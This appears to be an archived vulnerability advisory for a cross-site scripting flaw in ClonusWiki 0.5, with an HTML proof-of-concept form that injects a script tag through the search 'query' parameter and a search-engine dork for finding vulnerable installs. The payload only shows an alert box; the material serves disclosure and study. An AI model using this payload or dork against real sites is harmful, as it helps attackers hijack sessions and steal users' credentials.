@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/24101/info
+
+ClonusWiki is prone to an HTML-injection vulnerability because the application fails to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would run in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials and to control how the site is rendered to the user; other attacks are also possible.
+
+This issue is reported to affect ClonusWiki 0.5.
+
+
+<html>
+<head><title>ClonusWiki .5 - Cross-Site Scripting Vulnerability</title><body>
+<center><br><br>
+<font size=4>ClonusWiki .5 - Cross-Site Scripting Vulnerability</font><br>
+<font size=3>discovered by <a href="http://john-martinelli.com">John Martinelli</a> of <a
+href="http://redlevel.org">RedLevel Security</a><br><br>
+Google d0rk: <a href="http://www.google.com/search?hl=en&q=%22ClonusWiki+.5%22+intitle%3A%22ClonusWiki%22">"ClonusWiki
+.5" intitle:"ClonusWiki"</a>
+</font><br><br><br>
+
+<center>file <b>index.php</b> - variable <b>query</b> - method <b>get</b></center><br>
+<form action="http://clonuswiki.sourceforge.net" method="get">
+<input size=75 name="query" value=">"><script>alert(1)</script>">
+<input type="hidden" name="action" value="search">
+<input type=submit value="Execute XSS Attack" class="button">
+</form>
+<br>
+
+</body></html>
